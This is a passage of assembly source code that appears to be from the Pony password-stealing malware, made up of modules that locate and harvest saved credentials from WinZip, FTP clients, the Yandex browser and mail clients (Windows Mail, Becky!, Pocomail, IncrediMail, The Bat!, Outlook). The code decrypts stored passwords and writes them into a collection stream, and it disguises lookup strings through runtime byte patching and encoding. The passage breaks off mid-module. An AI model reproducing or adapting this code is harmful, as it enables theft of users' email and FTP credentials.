		invoke	MemFree, Password
		invoke	MemFree, Port
		invoke	MemFree, Dir
		
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
WinZipGrabRegPassword endp

WinZipGrabJobFiles proc reg_key, BasePath, stream
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	JobFile: DWORD
	LOCAL	dwType: DWORD
	LOCAL	dwLen: DWORD
	
	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumValue, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, addr dwType, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			.IF	(dwType != REG_SZ)
				inc	KeyIndex
				.CONTINUE
			.ENDIF
			
			invoke	RegReadValueStr, reg_key, BasePath, addr lpBuf, addr dwLen
			.IF	eax
				mov	JobFile, eax
				invoke	StrStrI, JobFile, offset CWinZipJobExt
				.IF	eax
					invoke	WinZipProcessWJFFile, stream, JobFile
				.ENDIF
				invoke	MemFree, JobFile
			.ENDIF

			inc	KeyIndex
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
WinZipGrabJobFiles endp

GrabWinZip proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WINZIP, 0
	mov	hdr_ofs, eax
	
	; Passwords stored in registry
	invoke	WinZipGrabRegPassword, dwCurrentUserKey, offset CWinZipFTPRegPath, stream
	invoke	WinZipGrabRegPassword, HKEY_LOCAL_MACHINE, offset CWinZipFTPRegPath, stream
	
	; Passwords stored in job files
	invoke	WinZipGrabJobFiles, dwCurrentUserKey, offset CWinZipJobRegPath, stream
	invoke	WinZipGrabJobFiles, HKEY_LOCAL_MACHINE, offset CWinZipJobRegPath, stream

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWinZip endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Yandex.Internet
; http://browser.yandex.ru/
; SFTP: not supported

IFDEF COMPILE_MODULE_YANDEXINTERNET

.data
	CYandexInternetAppDataDir	db	'\Yandex',0

.code

GrabYandexInternet proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_YANDEXINTERNET, 0
	mov	hdr_ofs, eax

	invoke	ChromeCommonScan, stream, offset CYandexInternetAppDataDir

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabYandexInternet endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; MyFTP
; Tested: ver 1.3.2
; SFTP: not supported

IFDEF COMPILE_MODULE_MYFTP

.data
	CMyFTPInstName		db	'My FTP',0
	CMyFTPConfigFile	db	'project.ini',0

.code

GrabMyFTP proc uses esi edi stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_MYFTP, 0
	mov	hdr_ofs, eax

	mov	esi, lpInstalledList
	mov	edi, lpInstalledNames
	.IF	byte ptr[edi]
	@n:
		invoke	StrStrI, edi, offset CMyFTPInstName
		.IF	eax
			invoke	ExtractFilePath, esi
			push	eax
			invoke	CommonFileScan, stream, eax, offset CMyFTPConfigFile, ITEMHDR_ID or 0 
			call	MemFree
		.ENDIF
		.WHILE	byte ptr[esi]
			inc	esi
		.ENDW
		inc	esi
		@Next	@n
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabMyFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; sherrod FTP
; Tested: ver 1.3.2.0
; SFTP: not supported

IFDEF COMPILE_MODULE_SHERRODFTP

.data
	CSherrodFTPConfigFile	db	'.xml',0
	CSherrodFTPProduct		db	'{74FF1730-B1F2-4D88-926B-1568FAE61DB7}',0

.code

INSTALLSTATE_UNKNOWN 	equ	-1 ; No action to be taken on the feature or component.
INSTALLSTATE_BROKEN 	equ 0 ; The feature is broken
INSTALLSTATE_ADVERTISED equ 1; Advertised feature
INSTALLSTATE_ABSENT		equ 2 ; The feature is not installed. 
INSTALLSTATE_LOCAL		equ 3 ; The feature is installed locally.
INSTALLSTATE_DEFAULT	equ 5 ; The product is to be installed with all features installed to the default states specified in the Feature table.

SherrodFTPFindMsiPath proc stream, lpProductStr
	LOCAL	lpInstallPath: DWORD
	LOCAL	dwInstallLen: DWORD

	.IF	!MyMsiGetComponentPath
		ret
	.ENDIF

	invoke	MemAlloc, MAX_PATH+1
	mov	lpInstallPath, eax

	mov	dwInstallLen, MAX_PATH

	lea	eax, dwInstallLen
	push	eax
	push	lpInstallPath
	push	lpProductStr
	push	lpProductStr
	call	MyMsiGetComponentPath

	invoke	lstrlen, lpInstallPath
	.IF	eax > 3 ; avoid processing system root directory
		invoke	CommonFileScan, stream, lpInstallPath, offset CSherrodFTPConfigFile, ITEMHDR_ID or 0 
	.ENDIF

	invoke	MemFree, lpInstallPath

	ret
SherrodFTPFindMsiPath endp

GrabSherrodFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_SHERRODFTP, 0
	mov	hdr_ofs, eax

	invoke	SherrodFTPFindMsiPath, stream, offset CSherrodFTPProduct

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabSherrodFTP endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; NovaFTP
; Tested: ver 1.1.3
; SFTP: implemented

IFDEF COMPILE_MODULE_NOVAFTP

.data
	CNovaFTPDbFile		db	'NovaFTP.db',0
	CNovaFTPAppDataDir	db	'\INSoftware\NovaFTP',0

.code

GrabNovaFTP proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_NOVAFTP, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CNovaFTPAppDataDir, offset CNovaFTPDbFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabNovaFTP endp

ENDIF

IFDEF GRAB_EMAIL

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Common Windows Mail decryption code

IFDEF COMPILE_MODULE_WINDOWS_MAIL
	COMPILE_WINDOWS_MAIL_CODE equ 1
ELSEIFDEF COMPILE_MODULE_WINDOWS_LIVE_MAIL
	COMPILE_WINDOWS_MAIL_CODE equ 1
ENDIF

IFDEF COMPILE_WINDOWS_MAIL_CODE

.data
	CWindowsMailXMLFile			db	'.oeaccount',0
	CWindowsMailSaltValue		db	'Salt',0
	WindowsMailSaltValueData	dd	0
	WindowsMailSaltValueDataLen	dd	0
	CWindowsMailPasswordTerminator	db	'>',0
	CWindowsMailPasswordEnd		db	'</',0

	CWindowsMailPasswordList	db	'<_OP3_Password2',0
	CWindowsMailSMTPPass		db	'<_MTP_Password2',0
								db	'<IMAP_Password2',0
								db	'<HTTPMail_Password2',0
								db	0

.code

WindowsMailDecryptPassword proc uses esi edi stream, szFileName
	LOCAL	map: MappedFile
	LOCAL	xml_str: DWORD
	LOCAL	xml_pass_start: DWORD
	LOCAL	pass_len: DWORD
	LOCAL	pass: DWORD
	LOCAL	nWideChars: DWORD
	LOCAL	pOptionalBlob: DATA_BLOB

	invoke	FileExists, szFileName
	.IF	!eax
		ret
	.ENDIF

	mov	byte ptr[CWindowsMailPasswordList+1], 'P'
	mov	byte ptr[CWindowsMailSMTPPass+1], 'S'
	
	invoke	MapFile, szFileName, addr map
	.IF	eax
		m2m	nWideChars, map.dwFileSize
		shr	nWideChars, 1
		; try to convert unicode string to ansi
		invoke	UnicodeToAnsiLen, map.lpMem, nWideChars
		.IF	eax
			mov	xml_str, eax
			mov	esi, eax
		.ELSE
			invoke	MemAlloc, map.dwFileSize
			mov	xml_str, eax
			invoke	MoveMem, map.lpMem, xml_str, map.dwFileSize
			mov	esi, xml_str
		.ENDIF

		.WHILE	esi && byte ptr[esi]
			mov	edi, offset CWindowsMailPasswordList
		@next_password_value:
			invoke	StrStr, esi, edi
			.IF	eax
				jmp	@password_value_found
			.ENDIF
			@Next	@next_password_value

			; password value not found
			.BREAK

		@password_value_found:
			; find xml tag-close bracket
			mov	esi, eax
			invoke	StrStrI, esi, offset CWindowsMailPasswordTerminator
			.IF	!eax
				.BREAK
			.ENDIF

			inc	eax
			mov	esi, eax

			mov	xml_pass_start, esi

			; find closing tag
			invoke	StrStr, esi, offset CWindowsMailPasswordEnd
			.IF	!eax
				.BREAK
			.ENDIF

			; replace closing tag with string null-terminator
			mov	dl, byte ptr[eax]
			mov	byte ptr[eax], 0

			push	eax
			push	edx
			
			invoke	lstrlen, xml_pass_start
			.IF	eax
				mov	pass_len, eax
				
				invoke	lstrdup, xml_pass_start
				mov	pass, eax

				invoke	DecodeHexString, pass, pass_len
				.IF	eax
					shr	pass_len, 1
					m2m	pOptionalBlob.pbData, WindowsMailSaltValueData
					m2m	pOptionalBlob.cbData, WindowsMailSaltValueDataLen
					invoke	CommonCryptUnprotectData, pass, addr pass_len, addr pOptionalBlob
					.IF	eax
						; Write encrypted-decrypted password pair
						invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 1
						invoke	StreamWriteString, stream, xml_pass_start
						invoke	StreamWriteBinaryString, stream, pass, pass_len
					.ENDIF
				.ENDIF
				
				invoke	MemFree, pass
			.ENDIF
			
			; restore null-terminator char to previous state
			pop	edx
			pop	eax
			
			mov	byte ptr[eax], dl
		.ENDW
		
		; Export xml file
		invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 2
		invoke	StreamWriteBinaryString, stream, map.lpMem, map.dwFileSize
		
		invoke	MemFree, xml_str
		invoke	UnmapFile, addr map
	.ELSE
	.ENDIF
	
	ret
WindowsMailDecryptPassword endp

WindowsMailProcessXMLFile proc stream, szXMLPath, item_id
	invoke	WindowsMailDecryptPassword, stream, szXMLPath
	ret
WindowsMailProcessXMLFile endp

WindowsMailAppDataCommonSingleFileScan proc stream, csidl, appdata_dir, config_file, item_id
	invoke	SHGetFolderPathStr, csidl
	.IF	eax
		invoke	PonyStrCatFreeArg1, eax, appdata_dir
		push	eax
		invoke	CommonFileScanCallback, stream, eax, config_file, item_id, offset WindowsMailProcessXMLFile
		call	MemFree
	.ENDIF
	ret
WindowsMailAppDataCommonSingleFileScan endp

WindowsMailCommonScan proc stream, base_appdata_dir
	invoke	WindowsMailAppDataCommonSingleFileScan, stream, CSIDL_APPDATA, base_appdata_dir, offset CWindowsMailXMLFile, ITEMHDR_ID or 0
	invoke	WindowsMailAppDataCommonSingleFileScan, stream, CSIDL_LOCAL_APPDATA, base_appdata_dir, offset CWindowsMailXMLFile, ITEMHDR_ID or 0
	invoke	WindowsMailAppDataCommonSingleFileScan, stream, CSIDL_COMMON_APPDATA, base_appdata_dir, offset CWindowsMailXMLFile, ITEMHDR_ID or 0
	ret
WindowsMailCommonScan endp
	
WindowsMailScan proc stream, szBaseAppDataDir, szBaseRegPath
	invoke	RegReadValueStr, dwCurrentUserKey, szBaseRegPath, offset CWindowsMailSaltValue, offset WindowsMailSaltValueDataLen
	.IF	eax
		mov	WindowsMailSaltValueData, eax
		invoke	WindowsMailCommonScan, stream, szBaseAppDataDir
		invoke	MemFree, WindowsMailSaltValueData
	.ENDIF
	ret
WindowsMailScan endp
	
ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Windows Live Mail
; Tested: Version 2011 (Build 15.4.3555.0308) on Windows 7 64-bit

IFDEF COMPILE_MODULE_WINDOWS_LIVE_MAIL

.data
	CWindowsLiveMailAppDataDir	db	'\Microsoft\Windows Live Mail',0
	CWindowsLiveMailRegPath		db	'Software\Microsoft\Windows Live Mail',0

.code

GrabWindowsLiveMail proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WINDOWS_LIVE_MAIL, 0
	mov	hdr_ofs, eax

	invoke	WindowsMailScan, stream, offset CWindowsLiveMailAppDataDir, offset CWindowsLiveMailRegPath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWindowsLiveMail endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Windows Mail

IFDEF COMPILE_MODULE_WINDOWS_MAIL

.data
	CWindowsMailAppDataDir		db	'\Microsoft\Windows Mail',0
	CWindowsMailRegPath			db	'Software\Microsoft\Windows Mail',0

.code

GrabWindowsMail proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_WINDOWS_MAIL, 0
	mov	hdr_ofs, eax

	invoke	WindowsMailScan, stream, offset CWindowsMailAppDataDir, offset CWindowsMailRegPath

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabWindowsMail endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Becky!
; Tested: version 2.61.01 [en]

IFDEF COMPILE_MODULE_BECKY

.data
	CBeckyRegPath			db	'Software\RimArts\B2\Settings',0
	CBeckyRegValue			db	'DataDir',0
	CBeckyRegValue2			db	'DataDirBak',0
	CBeckyMailboxFile		db	'Mailbox.ini',0

.code

GrabBecky proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_BECKY, 0
	mov	hdr_ofs, eax

	invoke	RegReadValueStr, dwCurrentUserKey, offset CBeckyRegPath, offset CBeckyRegValue, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CBeckyMailboxFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF

	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, offset CBeckyRegPath, offset CBeckyRegValue, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CBeckyMailboxFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF

	invoke	RegReadValueStr, dwCurrentUserKey, offset CBeckyRegPath, offset CBeckyRegValue2, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CBeckyMailboxFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF

	invoke	RegReadValueStr, HKEY_LOCAL_MACHINE, offset CBeckyRegPath, offset CBeckyRegValue2, NULL
	.IF	eax
		push	eax
		invoke	CommonFileScan, stream, eax, offset CBeckyMailboxFile, ITEMHDR_ID or 0
		call	MemFree
	.ENDIF

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabBecky endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Pocomail
; Tested: version 4.8.0.4400

IFDEF COMPILE_MODULE_POCOMAIL

.data
	CPocoMailRegPath		db	'Software\Poco Systems Inc',0
	CPocoMailPathValue		db	'Path',0
	CPocoMailIniFile		db	'\PocoSystem.ini',0
	CPocoMailIniSection		db	'Program',0
	CPocoMailIniValue		db	'DataPath',0
	CPocoMailConfigFile		db	'accounts.ini',0
	CPocoMailAppDataDir		db	'\Pocomail',0

.code

PocomailScanReg proc reg_key, BasePath, stream
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	ProfilePath: DWORD
	LOCAL	DataPath: DWORD

	invoke	MemAlloc, MAX_PATH+1
	mov	DataPath, eax

	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			push	eax
			mov	edx, eax
			invoke	PonyStrCat, edx, addr lpBuf
			mov	S, eax
			call	MemFree
			
			invoke	RegReadValueStr, reg_key, S, addr CPocoMailPathValue, NULL
			mov	ProfilePath, eax

			.IF	ProfilePath
				invoke	PonyStrCat, ProfilePath, offset CPocoMailIniFile
				push	eax
				invoke	GetPrivateProfileString, offset CPocoMailIniSection, offset CPocoMailIniValue, offset szNULL, DataPath, MAX_PATH, eax
				.IF	eax > 3
					invoke	CommonFileScan, stream, DataPath, offset CPocoMailConfigFile, ITEMHDR_ID or 0
				.ENDIF
				call	MemFree
			.ENDIF
			
			; recursively scan subfolders
			invoke	PocomailScanReg, reg_key, S, stream			
			invoke	MemFree, S
			
			invoke	MemFree, ProfilePath
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF

	invoke	MemFree, DataPath
	ret
PocomailScanReg endp

GrabPocomail proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_POCOMAIL, 0
	mov	hdr_ofs, eax

	invoke	PocomailScanReg, dwCurrentUserKey, offset CPocoMailRegPath, stream
	invoke	PocomailScanReg, HKEY_LOCAL_MACHINE, offset CPocoMailRegPath, stream

	invoke	AppDataCommonFileScan, stream, offset CPocoMailAppDataDir, offset CPocoMailConfigFile, ITEMHDR_ID or 0

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabPocomail endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; IncrediMail
; Tested: version 2.5 beta

IFDEF COMPILE_MODULE_INCREDIMAIL

.data
	CIncrediMailRegPath		db	'Software\IncrediMail',0
	CIncrediMailEmailValue	db	'EmailAddress',0
	CIncrediMailProtocol	db	'Technology',0
	CIncrediMailPOP3Server	db	'PopServer',0
	CIncrediMailPOP3Port	db	'PopPort',0
	CIncrediMailPOP3User	db	'PopAccount',0
	CIncrediMailPOP3Pass	db	'PopPassword',0
	CIncrediMailSMTPServer	db	'_mtpServer',0
	CIncrediMailSMTPPort	db	'_mtpPort',0
	CIncrediMailSMTPUser	db	'_mtpAccount',0
	CIncrediMailSMTPPass	db	'_mtpPassword',0

.code

IncrediMailScanReg proc reg_key, BasePath, stream
	LOCAL	hkHandle: DWORD
	LOCAL	KeyIndex: DWORD
	LOCAL	dwBufLen: DWORD
	LOCAL	lpBuf[2048]: BYTE
	LOCAL	S: DWORD
	LOCAL	Email: DWORD
	LOCAL	Protocol: DWORD
	LOCAL	POP3Server: DWORD
	LOCAL	POP3Port: DWORD
	LOCAL	dwPOP3PortLen: DWORD
	LOCAL	POP3User: DWORD
	LOCAL	POP3Pass: DWORD
	LOCAL	dwPOP3PassLen: DWORD
	LOCAL	SMTPServer: DWORD
	LOCAL	SMTPPort: DWORD
	LOCAL	dwSMTPPortLen: DWORD
	LOCAL	SMTPUser: DWORD
	LOCAL	SMTPPass: DWORD
	LOCAL	dwSMTPPassLen: DWORD

	invoke	RegOpenKey, reg_key, BasePath, addr hkHandle
	.IF	!eax
		mov	KeyIndex, 0
		.WHILE	TRUE
			mov	dwBufLen, 2047
			invoke	RegEnumKeyEx, hkHandle, KeyIndex, addr lpBuf, addr dwBufLen, NULL, NULL, NULL, NULL
			.IF	eax
				.BREAK
			.ENDIF
			
			invoke	PonyStrCat, BasePath, addr szSlash
			mov	edx, eax
			invoke	PonyStrCatFreeArg1, edx, addr lpBuf
			mov	S, eax
			
			; Email, Protocol
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailEmailValue, NULL
			mov	Email, eax
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailProtocol, NULL
			mov	Protocol, eax

			; POP3/IMAP
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailPOP3Server, NULL
			mov	POP3Server, eax
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailPOP3Port, addr dwPOP3PortLen
			mov	POP3Port, eax
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailPOP3User, NULL
			mov	POP3User, eax
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailPOP3Pass, addr dwPOP3PassLen
			mov	POP3Pass, eax

			; SMTP
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailSMTPServer, NULL
			mov	SMTPServer, eax
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailSMTPPort, addr dwSMTPPortLen
			mov	SMTPPort, eax
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailSMTPUser, NULL
			mov	SMTPUser, eax
			invoke	RegReadValueStr, reg_key, S, addr CIncrediMailSMTPPass, addr dwSMTPPassLen
			mov	SMTPPass, eax

			.IF	Email && (dwPOP3PassLen || dwSMTPPassLen)
				; export data, type = 0000: Email | Protocol | POP3Server | POP3Port | POP3User | POP3Pass | SMTPServer | SMTPPort | SMTPUser | SMTPPass
				invoke	StreamWriteDWORD, stream, ITEMHDR_ID or 0
				invoke	StreamWriteString, stream, Email
				invoke	StreamWriteString, stream, Protocol

				invoke	StreamWriteString, stream, POP3Server
				invoke	StreamWriteBinaryString, stream, POP3Port, dwPOP3PortLen
				invoke	StreamWriteString, stream, POP3User
				invoke	StreamWriteBinaryString, stream, POP3Pass, dwPOP3PassLen

				invoke	StreamWriteString, stream, SMTPServer
				invoke	StreamWriteBinaryString, stream, SMTPPort, dwSMTPPortLen
				invoke	StreamWriteString, stream, SMTPUser
				invoke	StreamWriteBinaryString, stream, SMTPPass, dwSMTPPassLen
			.ENDIF

			; recursively scan subfolders
			invoke	IncrediMailScanReg, reg_key, S, stream			
			invoke	MemFree, S
			
			invoke	MemFree, Email
			invoke	MemFree, Protocol
			invoke	MemFree, POP3Server
			invoke	MemFree, POP3Port
			invoke	MemFree, POP3User
			invoke	MemFree, POP3Pass
			invoke	MemFree, SMTPServer
			invoke	MemFree, SMTPPort
			invoke	MemFree, SMTPUser
			invoke	MemFree, SMTPPass
			
			inc	KeyIndex			
		.ENDW
		invoke	RegCloseKey, hkHandle
	.ENDIF
	ret
IncrediMailScanReg endp

GrabIncrediMail proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_INCREDIMAIL, 0
	mov	hdr_ofs, eax

	mov	byte ptr[CIncrediMailSMTPServer], 'S'
	mov	byte ptr[CIncrediMailSMTPPort], 'S'
	mov	byte ptr[CIncrediMailSMTPUser], 'S'
	mov	byte ptr[CIncrediMailSMTPPass], 'S'

	invoke	IncrediMailScanReg, dwCurrentUserKey, offset CIncrediMailRegPath, stream
	invoke	IncrediMailScanReg, HKEY_LOCAL_MACHINE, offset CIncrediMailRegPath, stream

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabIncrediMail endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; The Bat!
; Tested: Version 5.0.36.2

IFDEF COMPILE_MODULE_THEBAT

.data
	CTheBatConfigFileOld		db	'account.cfg',0
	CTheBatConfigFileNew		db	'account.cfn',0
	CTheBatAppDataDir1			db	'\BatMail',0
	CTheBatAppDataDir2			db	'\The Bat!',0
	CTheBatRegPath				db	'Software\RIT\The Bat!',0
	CTheBatDepotRegPath			db	'Software\RIT\The Bat!\Users depot',0
	CTheBatWorkDirValue			db	'Working Directory',0
	CTheBatProgramDirValue		db	'ProgramDir',0
	CTheBatDepotCountValue		db	'Count',0
	CTheBatDefaultDepotValue	db	'Default',0
	CTheBatDepotValueFmt		db	'Dir #%d',0

.code

TheBatScanFiles proc stream, rem_dir
	LOCAL	rem_dir_exp: DWORD

	; process both expanded and plain directory paths
	; some The Bat! versions do not expand paths and do process folder names like `%appdata%`

	invoke	CommonFileScan, stream, rem_dir, offset CTheBatConfigFileOld, ITEMHDR_ID or 0
	invoke	CommonFileScan, stream, rem_dir, offset CTheBatConfigFileNew, ITEMHDR_ID or 1

	invoke	ExpandEnvStr, rem_dir
	.IF	eax
		mov	rem_dir_exp, eax
		invoke	CommonFileScan, stream, rem_dir_exp, offset CTheBatConfigFileOld, ITEMHDR_ID or 0
		invoke	CommonFileScan, stream, rem_dir_exp, offset CTheBatConfigFileNew, ITEMHDR_ID or 1
		invoke	MemFree, rem_dir_exp
	.ENDIF

	ret
TheBatScanFiles endp

TheBatScanReg proc stream, reg_key
	LOCAL	reg_value: DWORD
	LOCAL	count_value: DWORD
	LOCAL	count_value_len: DWORD
	LOCAL	count: DWORD
	LOCAL	depot_str[40]: BYTE
	LOCAL	dwPathLen: DWORD

	; Working Directory
	invoke	RegReadValueStr, reg_key, offset CTheBatRegPath, offset CTheBatWorkDirValue, NULL
	.IF	eax
		mov	reg_value, eax
		invoke	TheBatScanFiles, stream, reg_value
		invoke	MemFree, reg_value
	.ENDIF

	; ProgramDir
	invoke	RegReadValueStr, reg_key, offset CTheBatRegPath, offset CTheBatProgramDirValue, NULL
	.IF	eax
		mov	reg_value, eax
		invoke	TheBatScanFiles, stream, reg_value
		invoke	MemFree, reg_value
	.ENDIF

	; Default depot
	invoke	RegReadValueStr, reg_key, offset CTheBatDepotRegPath, offset CTheBatDefaultDepotValue, NULL
	.IF	eax
		mov	reg_value, eax
		invoke	TheBatScanFiles, stream, reg_value
		invoke	MemFree, reg_value
	.ENDIF

	; Other user depots
	invoke	RegReadValueStr, reg_key, offset CTheBatDepotRegPath, offset CTheBatDepotCountValue, addr count_value_len
	.IF	eax
		mov	count_value, eax
		.IF	count_value_len == 4 ; check if value is a dword
			mov	eax, count_value
			mov	eax, dword ptr[eax]
			.IF	eax > 10000
				mov	eax, 10000
			.ENDIF
			mov	count, eax

			.WHILE	count
				invoke	wsprintf, addr depot_str, offset CTheBatDepotValueFmt, count

				invoke	RegReadValueStr, reg_key, offset CTheBatDepotRegPath, addr depot_str, addr dwPathLen
				.IF	eax
					mov	reg_value, eax

					.IF	dwPathLen > 3
						invoke	TheBatScanFiles, stream, reg_value
					.ENDIF

					invoke	MemFree, reg_value
				.ENDIF

				dec	count
			.ENDW
		.ENDIF
		invoke	MemFree, count_value
	.ENDIF

	ret
TheBatScanReg endp

GrabTheBat proc stream
	LOCAL	hdr_ofs: DWORD

	invoke	StreamWriteModuleHeader, stream, MODULE_THEBAT, 0
	mov	hdr_ofs, eax
	
	invoke	AppDataCommonFileScan, stream, offset CTheBatAppDataDir1, offset CTheBatConfigFileOld, ITEMHDR_ID or 0
	invoke	AppDataCommonFileScan, stream, offset CTheBatAppDataDir1, offset CTheBatConfigFileNew, ITEMHDR_ID or 1
	invoke	AppDataCommonFileScan, stream, offset CTheBatAppDataDir2, offset CTheBatConfigFileOld, ITEMHDR_ID or 0
	invoke	AppDataCommonFileScan, stream, offset CTheBatAppDataDir2, offset CTheBatConfigFileNew, ITEMHDR_ID or 1

	invoke	TheBatScanReg, stream, dwCurrentUserKey
	invoke	TheBatScanReg, stream, HKEY_LOCAL_MACHINE

	invoke	StreamUpdateModuleLen, stream, hdr_ofs
	ret
GrabTheBat endp

ENDIF

; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
; Outlook
; Tested: Outlook Express
; Tested: Microsoft Outlook 2000
; Tested: Microsoft Outlook XP
; Tested: Microsoft Outlook 2007
; Tested: Microsoft Outlook 2010

IFDEF COMPILE_MODULE_OUTLOOK

.data
    COutlookRegValues		db	'RLUQ!Dl`hm!@eesdrr',0
						    db	'RLUQ!Rdswds',0
						    db	'QNQ2!Rdswds',0
						    db	'QNQ2!Trds!O`ld',0
						    db	'RLUQ!Trds!O`ld',0
						    db	'OOUQ!Dl`hm!@eesdrr',0
						    db	'OOUQ!Trds!O`ld',0
						    db	'OOUQ!Rdswds',0
						    db	'HL@Q!Rdswds',0
						    db	'HL@Q!Trds!O`ld',0
						    db	'Dl`hm',0
